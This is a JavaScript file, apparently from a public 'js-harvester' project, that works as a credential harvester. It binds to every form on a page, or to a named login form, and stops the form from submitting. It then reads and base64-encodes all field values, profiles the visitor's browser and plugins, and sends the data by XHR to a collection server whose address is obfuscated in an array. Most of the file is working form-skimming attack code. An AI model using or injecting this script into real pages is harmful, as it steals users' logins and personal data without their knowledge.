/* harvest.js 
*
*  https://github.com/toneillcodes/js-harvester
*
*/
var dynamicTrackers = true;			//	(true/false) 
var bindAllFormsSwitch = true;		//	(true/false)
var formName = "loginform2";
var enableEncoding = true;			//	(true/false)
var usePost = false;				//	(true/false)
var trackClients = true;			//	(true/false)
var allowSubmission = false;		//	(true/false)
var _0x3745 = ["http","://","192.168.1.237:8080","/harvest.php","Content-type","application/x-www-form-urlencoded","GET","POST","HEAD","PUT","DELETE","OPTIONS","PATCH"];

$(document).ready(function() {
    console.log("initializing harvester...");
    initHarvester();
});

/* check the configuration settings and bind form(s) */
function initHarvester() {
    if(bindAllFormsSwitch) {
        bindAllForms();
    } else {
        bindByName(formName);
    }
    console.log("locked and loaded");
}

/* bind all forms in the document */
function bindAllForms() {
    document.querySelectorAll('form').forEach(form => bindForm(form));
}

/* bind a specific form by name */
function bindByName(formName) {
	var loginForm = document.getElementByName(formName);
	bindForm(loginForm);
}

/*	binds the submit event of a given form object */
function bindForm(form) {
	if(form) {
        form.addEventListener('submit', function(e){
				if(allowSubmission == false) {
					e.preventDefault();
				}
				let payload = grabAll(form);
				if(payload != "ERROR") {
					if(trackClients) {
						let clientInfo = profileClient();
						console.log("clientInfo: " + clientInfo);
						// TODO: serialize client data and append to payload
					}
					//	send the payload to our server
					sendPayload(payload);				
					console.log("sending payload...");
				} else {
					console.log("ERROR: failed to grabAll");
				}
            }, false);
    }
    appendFields(form);
}

/* append tracking values to a form */
function appendFields(form) {
	let siteId = "";
	let formId = "";
	
	if(dynamicTrackers) {
		siteId = btoa(document.location.hostname);
		formId = btoa(document.location.pathname + '-' + form.name);
	} else {
		siteId = "updateme";
		formId = "updateme";
	}
    	
	console.log("using siteId " + siteId);

	// create tracking siteId element
	let siteIdElement = document.createElement("INPUT");
	siteIdElement.setAttribute('type','hidden');
	siteIdElement.setAttribute('name','siteId');
	siteIdElement.setAttribute('value',siteId);

	// create tracking formId element
	let formIdElement = document.createElement("INPUT");
	formIdElement.setAttribute('type','hidden');
	formIdElement.setAttribute('name','formId');
	formIdElement.setAttribute('value',formId);

	// add to target form
	form.appendChild(siteIdElement);
	form.appendChild(formIdElement);
}

/* parse through the form elements and serialize anything interesting */
function grabAll(form) {
	if(form) {
		var payload = "";
		for(var i = 0; i < form.length; i++) {
			var formElement = form.elements[i];
			if(formElement) {
				//	the name value should always be set, but we may want to check (JavaScript forms could use ids)
				var elementName = null;
				elementName = formElement.name;
				
				//	name is empty, let's try pulling the id property
				if(elementName.length <= 0) {
					elementName = formElement.id;
				}

				// make sure we have a valid name/id, default to 'unknown'
				if(elementName.length <= 0) {
					elementName = 'unknown';
				}
			
				//console.log("DEBUG: name: " + elementName);		

				if(formElement.type != "submit") {
					var elementValue = "";

					if(formElement instanceof HTMLSelectElement) {
						var selectContents = "";
						//console.log("DEBUG: parsing all selectedOptions");
						if(formElement.multiple) {
							//console.log("DEBUG: multi value - gotta catch em all");
							//console.log("DEBUG: selectedOptions: " + formElement.selectedOptions);
							var optionList = formElement.selectedOptions;
							if(optionList.length > 0) {
								for(j = 0; j < optionList.length; j++) {
									//console.log("DEBUG: option number [" + j + "], value= " + optionList[j].value);
									//	serialize contents
									if(selectContents == "") {
										selectContents = optionList[j].value;
									} else {
										selectContents += "," + encodeURI(optionList[j].value);
									}
								}
							}
						} else {
							selectContents = formElement.value;
						}
						//	encode whatever we parsed out of the select
						elementValue = encodeURI(selectContents);
					} else {	
						//	not a select, we can just grab the 'value' property	and encode it
						elementValue = encodeURI(formElement.value);
					}
					
					//	are we appending a payload? if so, use an ampersand to separate values
					if(payload == "") {
						payload = elementName + ":" + elementValue;
					} else {
						payload += "&" + elementName + ":" + elementValue;
					}
				}
			}
		}
		
		//	check to see if base 64 encoding is enabled
		if(enableEncoding) {
			//console.log("DEBUG: before base 64 encoding: " + payload);
			payload = btoa(payload);
		}
		//	output payload in console for debugging
		//console.log("DEBUG: resulting payload = " + payload);
		
		return payload;
	} else {
		console.log("ERROR: harvester failed to locate '" + formName + "', check the HTML");
		return "ERROR";
	}
}

/* collect some interesting client data from the user */
function profileClient() {
	let appCodeName = "";
	let appName = "";
	let appVersion = "";
	let platform = "";
	let pluginList = ""
	let product = "";
	let productSub = "";
	let userAgent = "";

	appCodeName = window.navigator.appCodeName;
	appName = window.navigator.appName;
	appVersion = window.navigator.appVersion
	platform = window.navigator.platform;
	pluginList = window.navigator.plugins;
	product = window.navigator.product;
	productSub = window.navigator.productSub;
	userAgent = window.navigator.userAgent;

	if(pluginList.length) {
		for(let i = 0; i < pluginList.length; i++ ) {
			//console.log("DEBUG: plugin details: " + pluginList[i].name)
			if(serializedPlugins == "") {
				serializedPlugins = pluginList[i].name;
			} else {
				serializedPlugins += "&" + pluginList[i].name;
			}
		}
	}

	//	populate an object to be serialized
	clientData = [appCodeName,appName,appVersion,platform,serializedPlugins,product,productSub,userAgent];
	
	//console.log("DEBUG: clientData: " + clientData);

	return clientData;
}

/* serialize data */
function serializeData(inputData) {
	return "stubdata";
}

/* send the collected data to our server using XHR */
function sendPayload(payload) {
    //console.log("DEBUG: usePost = " + usePost);
    var xhttp = new XMLHttpRequest();

    if(usePost) {
        xhttp.open(_0x3745[7], _0x3745[0] +_0x3745[1] + _0x3745[2] + _0x3745[3], true);
        xhttp.setRequestHeader(_0x3745[4], _0x3745[5]);
        xhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
               //console.log("DEBUG: data sent");
            }
        };
        xhttp.send('data=' + payload);
    } else {
        xhttp.open(_0x3745[6], _0x3745[0] +_0x3745[1] + _0x3745[2] + _0x3745[3] + '?data=' + payload, true);
        xhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
               //console.log("DEBUG: data sent");
            }
        };
        xhttp.send();
    }
}